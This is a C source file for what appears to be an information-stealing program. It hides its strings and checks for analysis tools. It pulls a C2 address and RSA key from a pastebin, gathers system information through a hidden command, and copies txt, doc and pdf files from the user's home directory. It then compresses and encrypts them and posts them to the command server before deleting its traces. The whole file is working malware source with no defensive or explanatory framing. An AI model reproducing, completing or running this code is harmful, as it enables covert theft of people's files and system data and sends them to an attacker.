#include <wisp.h>

/*-------------------------------------------
   Network 
-------------------------------------------*/
size_t networkWriteCallback(void *contents,
                                   size_t size,
                                   size_t nmemb,
                                   void *userp) {
    size_t real = size*nmemb;
    mem_buf_t *chunk = userp;
    char *ptr = realloc(chunk->data,
                       chunk->size + real + 1);
    if (!ptr) return 0;
    chunk->data = ptr;
    memcpy(chunk->data + chunk->size,
           contents, real);
    chunk->size += real;
    chunk->data[chunk->size] = '\0';
    return real;
}

RSA* grab_rsa(const char *url) {
    if (!url || strlen(url) < 5) return NULL;
    CURL *curl = curl_easy_init();
    if (!curl) return NULL;

    mem_buf_t chunk = { malloc(1), 0 };
    if (!chunk.data) { curl_easy_cleanup(curl); return NULL; }

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION,
                     networkWriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &chunk);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);

    if (curl_easy_perform(curl) != CURLE_OK) {
        curl_easy_cleanup(curl);
        free(chunk.data);
        return NULL;
    }
    curl_easy_cleanup(curl);

    BIO *bio = BIO_new_mem_buf(chunk.data,
                               chunk.size);
    RSA *rsaPubKey =
       PEM_read_bio_RSA_PUBKEY(bio, NULL, NULL, NULL);
    BIO_free(bio);
    free(chunk.data);
    return rsaPubKey;
}

void _url(char *buf) {
    if (_strings[0]) { 
        strcpy(buf, _strings[0]);
    } else {
       //  
    }
}

char* fetch_past(const char *url) {
    CURL *curl = curl_easy_init();
    if (!curl) return NULL;

    mem_buf_t chunk = { malloc(1), 0 };
    if (!chunk.data) { curl_easy_cleanup(curl);
                       return NULL; }

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION,
                     networkWriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &chunk);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);

    if (curl_easy_perform(curl) != CURLE_OK) {
        curl_easy_cleanup(curl);
        free(chunk.data);
        return NULL;
    }
    curl_easy_cleanup(curl);
    return chunk.data;
}

int from_past(const char *content,
                     char *pubkey_url,
                     char *c2_endpoint) {
    char *copy = strdup(content);
    if (!copy) return 0;

    char *line1 = strtok(copy, "\n");
    if (line1) {
        while (*line1==' '||*line1=='\t') line1++;
        char *end = line1 + strlen(line1)-1;
        while (end>line1&&(*end==' '||*end=='\t')) end--;
        *(end+1) = '\0';
        strcpy(pubkey_url, line1);
    }
    char *line2 = strtok(NULL, "\n");
    if (line2) {
        while (*line2==' '||*line2=='\t') line2++;
        char *end = line2+strlen(line2)-1;
        while (end>line2&&(*end==' '||*end=='\t')) end--;
        *(end+1) = '\0';
        strcpy(c2_endpoint, line2);
    }
    free(copy);
    return 1;
}

unsigned char* wrap_loot(const unsigned char *plaintext,
                                size_t plaintext_len,
                                size_t *out_len,
                                RSA *rsa_pubkey) {
    unsigned char aes_key[16], iv[IV_SIZE];
    if (!RAND_bytes(aes_key, sizeof(aes_key)) ||
        !RAND_bytes(iv, IV_SIZE))
        return NULL;

    int max_ct = plaintext_len + IV_SIZE;
    unsigned char *ciphertext = malloc(max_ct);
    if (!ciphertext) return NULL;

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) { free(ciphertext); return NULL; }
    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL,
                                aes_key, iv)) {
        EVP_CIPHER_CTX_free(ctx);
        free(ciphertext);
        return NULL;
    }
    int len_ct = 0, final_ct = 0;
    if (1 != EVP_EncryptUpdate(ctx, ciphertext, &len_ct,
                               plaintext, plaintext_len) ||
        1 != EVP_EncryptFinal_ex(ctx,
                                 ciphertext + len_ct,
                                 &final_ct)) {
        EVP_CIPHER_CTX_free(ctx);
        free(ciphertext);
        return NULL;
    }
    EVP_CIPHER_CTX_free(ctx);
    int ciphertext_len = len_ct + final_ct;

    int rsa_size = RSA_size(rsa_pubkey);
    unsigned char *encrypted_key = malloc(rsa_size);
    if (!encrypted_key) {
        free(ciphertext);
        return NULL;
    }
    int ek_len = RSA_public_encrypt(sizeof(aes_key),
                                    aes_key,
                                    encrypted_key,
                                    rsa_pubkey,
                                    RSA_PKCS1_OAEP_PADDING);
    if (ek_len == -1) {
        free(encrypted_key);
        free(ciphertext);
        return NULL;
    }

    *out_len = 4 + ek_len + IV_SIZE + 4 + ciphertext_len;
    unsigned char *message = malloc(*out_len);
    if (!message) {
        free(encrypted_key);
        free(ciphertext);
        return NULL;
    }

    unsigned char *p = message;
    uint32_t net;
    net = htonl(ek_len);
    memcpy(p, &net, 4); p += 4;
    memcpy(p, encrypted_key, ek_len); p += ek_len;
    free(encrypted_key);

    memcpy(p, iv, IV_SIZE); p += IV_SIZE;
    net = htonl(ciphertext_len);
    memcpy(p, &net, 4); p += 4;
    memcpy(p, ciphertext, ciphertext_len);

    free(ciphertext);
    return message;
}

/*-------------------------------------------
   File-collection & bundling
-------------------------------------------*/
int copyFile(const char *src, const char *dst) {
    FILE *fin = fopen(src, "rb"),
         *fout= fopen(dst, "wb");
    if (!fin||!fout) {
        if (fin) fclose(fin);
        if (fout) fclose(fout);
        return -1;
    }
    char buf[4096];
    size_t n;
    while ((n=fread(buf,1,sizeof(buf),fin))>0) {
        if (fwrite(buf,1,n,fout)!=n) {
            fclose(fin); fclose(fout);
            return -1;
        }
    }
    fclose(fin); fclose(fout);
    return 0;
}

unsigned char* compressData(const unsigned char *in,
                                   size_t inLen,
                                   size_t *outLen) {
    uLongf destLen = compressBound(inLen);
    unsigned char *out = malloc(destLen);
    if (!out) return NULL;
    if (compress(out, &destLen, in, inLen) != Z_OK) {
        free(out);
        return NULL;
    }
    *outLen = destLen;
    return out;
}

const char *ALLOWED[] = { "txt","doc","pdf",NULL };
int fileCollector(const char *fpath,
                         const struct stat *sb,
                         int typeflag,
                         struct FTW *ftwbuf) {
    (void)ftwbuf;
    if (fileCount >= MAX_FILES) return 0;
    if (typeflag == FTW_F && sb->st_size > 0) {
        const char *ext = strrchr(fpath, '.');
        if (ext && ext != fpath) {
            ext++;
            for (int i=0; ALLOWED[i]; i++){
                if (strcasecmp(ext, ALLOWED[i])==0){
                    char *copy = strdup(fpath);
                    if (!copy) break;
                    char *base = strdup(basename(copy));
                    free(copy);
                    if (!base) break;
                    char dst[512]={0};
                    snprintf(dst,sizeof(dst),"%s/%s",
                             tmpDirectory, base);
                    free(base);
                    if (copyFile(fpath,dst)==0) {
                        file_t *o = malloc(sizeof(file_t));
                        if (!o) break;
                        o->path = strdup(dst);
                        o->size = sb->st_size;
                        files[fileCount++] = o;
                    }
                    break;
                }
            }
        }
    }
    return 0;
}

void overn_out(const char *server_url,
               const unsigned char *data,
               size_t size) {
    if (!server_url||strlen(server_url)<5) return;
    CURL *curl = curl_easy_init();
    if (!curl) return;
    struct curl_slist *hdr =
    hdr = curl_slist_append(NULL, _strings[1]);
    curl_easy_setopt(curl, CURLOPT_URL, server_url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, hdr);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS,
                     data);
    curl_easy_setopt(curl,
                     CURLOPT_POSTFIELDSIZE, size);
    (void)curl_easy_perform(curl);
    curl_slist_free_all(hdr);
    curl_easy_cleanup(curl);
}

void sendFilesBundle(RSA *rsaPubKey) {
    if (!fileCount) return;
    char archivePath[512]={0};
    const char *tmpId = tmpDirectory + 5;
       if (_strings[3]) {
        snprintf(archivePath, sizeof(archivePath), _strings[3], tmpId);
    } else {
        
    }

    char tarcmd[1024]={0};
    snprintf(tarcmd,sizeof(tarcmd),
             _strings[2],
             archivePath, tmpDirectory);
    if (system(tarcmd)) return;

    FILE *fp = fopen(archivePath,"rb");
    if (!fp) return;
    fseek(fp,0,SEEK_END);
    long archiveSize = ftell(fp);
    fseek(fp,0,SEEK_SET);

    unsigned char *archiveData = malloc(archiveSize);
    if (!archiveData) { fclose(fp); return; }
    if (fread(archiveData,1,archiveSize,fp)
        != (size_t)archiveSize) {
        fclose(fp);
        free(archiveData);
        return;
    }
    fclose(fp);
    unlink(archivePath);

    size_t compSize = 0;
    unsigned char *compData = compressData(archiveData,
                                           archiveSize,
                                           &compSize);
    free(archiveData);
    if (!compData) return;

    size_t packagedLen = 0;
    unsigned char *pkg = wrap_loot(compData,
                                   compSize,
                                   &packagedLen,
                                   rsaPubKey);
    free(compData);
    if (pkg) {
        overn_out(C2_ENDPOINT,
                  pkg, packagedLen);
        free(pkg);
    }
}

/*-------------------------------------------
  SystemInfo & profiling
-------------------------------------------*/
void profiler(char *buffer, size_t bufsize, size_t *offset) {
    const char *cmd = _strings[4];
    
    FILE *fp = popen(cmd, "r");
    if (!fp) return;

    const char *info_header = _strings[5];
    char line[1035];
    while (fgets(line,sizeof(line),fp))
        *offset += snprintf(buffer+*offset,
                            bufsize-*offset,"%s",line);
    pclose(fp);
}

void collectSystemInfo(RSA *rsaPubKey) {
    char buff[PAGE_SIZE]={0};
    size_t offset = 0;
    char system_id[37];
    mint_uuid(system_id);
   const char *id_format = _strings[6];
    offset += snprintf(buff+offset, sizeof(buff)-offset, id_format, system_id);
    const char *host_header = _strings[7];
    offset += snprintf(buff+offset, sizeof(buff)-offset, host_header);
    profiler(buff,sizeof(buff),&offset);

    size_t packaged_len = 0;
    unsigned char *packaged =
      wrap_loot((unsigned char*)buff,
                offset,
                &packaged_len,
                rsaPubKey);
    if (packaged) {
        overn_out(C2_ENDPOINT,
                  packaged, packaged_len);
        free(packaged);
    }
}

void mint_uuid(char *id) {
    uuid_t uuid;
    uuid_generate_random(uuid);
    uuid_unparse(uuid, id);
}

//-------------------------------------------
// Main 
//-------------------------------------------
int sendProfile(void) {
    // Anti-check
    if (scan()) {
        panic();
    }

    if (mkdir(tmpDirectory, 0700) == -1 && errno != EEXIST) {
        panic();
    }

    initialize__strings();

    if (!_strings[0]) {
        panic();
    }

    char pastebin_url[256] = {0};
    _url(pastebin_url);

    CURL *check = curl_easy_init();
    if (!check) {
        cleanup__strings();
        panic();
    }
    curl_easy_setopt(check, CURLOPT_URL, pastebin_url);
    curl_easy_setopt(check, CURLOPT_NOBODY, 1L);
    curl_easy_setopt(check, CURLOPT_TIMEOUT, 5L);
    
    if (curl_easy_perform(check) != CURLE_OK) {
        curl_easy_cleanup(check);
        cleanup__strings();
        panic();
    }
    curl_easy_cleanup(check);

    char *pastebin_content = fetch_past(pastebin_url);
    if (!pastebin_content) {
        cleanup__strings();
        panic();
    }

    char pubkey_url[1024] = {0};
    char c2_endpoint[1024] = {0};
    if (!from_past(pastebin_content, pubkey_url, c2_endpoint)) {
        free(pastebin_content);
        cleanup__strings();
        panic();
    }
    free(pastebin_content);

    if (strlen(pubkey_url) < 5 || strlen(c2_endpoint) < 5) {
        cleanup__strings();
        panic();
    }
    strcpy(C2_ENDPOINT, c2_endpoint);

    if (curl_global_init(CURL_GLOBAL_DEFAULT) != 0) {
        cleanup__strings();
        panic();
    }
    OpenSSL_add_all_algorithms();

    RSA *rsaPubKey = grab_rsa(pubkey_url);
    if (!rsaPubKey) {
        curl_global_cleanup();
        cleanup__strings();
        panic();
    }

    collectSystemInfo(rsaPubKey);

    const char *home = getenv("HOME");
    if (!home) home = ".";
    nftw(home, fileCollector, 10, FTW_PHYS);

    sendFilesBundle(rsaPubKey);

    for (int i = 0; i < fileCount; i++) {
        unlink(files[i]->path);
        free(files[i]->path);
        free(files[i]);
    }
    rmdir(tmpDirectory);
    RSA_free(rsaPubKey);
    EVP_cleanup();
    curl_global_cleanup();
    cleanup__strings();

    return 0;
}
